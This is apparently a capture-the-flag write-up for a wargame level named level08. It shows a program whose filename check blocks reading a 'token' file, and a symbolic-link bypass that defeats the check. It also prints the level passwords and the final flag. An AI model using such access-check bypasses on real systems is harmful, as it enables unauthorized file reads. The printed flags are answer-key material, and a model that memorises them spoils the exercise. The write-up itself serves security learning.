```bash
$ su level08 -> fiumuikeil55xe9cu4dood66h
```

### Vulnerability Assessment

The `level08` executable and a file named `token` are present in the directory. When attempting to read the `token` file using `level08`, access is denied. However, reading other files, like a created test file in `/tmp`, works fine:

```bash
$ ./level08
./level08 [file to read]
$ ./level08 token
You may not access 'token'
$ echo 'hello' > /tmp/test
$ ./level08 /tmp/test
hello

```

Using `ltrace`, it's observed that `strstr` is employed to check if the filename includes the substring "token". The program exits if "token" is part of the filename, indicating a protective measure against directly reading the `token` file.

```bash
$ ltrace ./level08 /tmp/test
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/test", "token")                                                          = NULL
open("/tmp/test", 0, 014435162522)                                                    = 3
read(3, "hello\n", 1024)                                                                = 4
write(1, "hello\n", 4123
)                                                                  = 4
```

### Exploit

To bypass this filename check, a symbolic link can be created. The link points to the `token` file but does not include "token" in its name. This would pass the `strstr()` comparison, allowing `level08` to open the actual `token` file:

1. Create a symbolic link to `token` with a different name:
    
    ```bash
    $ ln -s /home/user/level08/token /tmp/flag
    
    ```
    
2. Use `level08` to read the symbolic link:
    
    ```bash
    $ ./level08 /tmp/flag
    quif5eloekouj29ke0vouxean
    
    ```
    

By following these steps, the program reads the content of the `token` file via the symbolic link, bypassing the filename check. Consequently, the actual content of the `token` file is revealed, providing the necessary information to switch to `flag08` and retrieve the final token:

```bash
$ su flag08 -> quif5eloekouj29ke0vouxean
$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```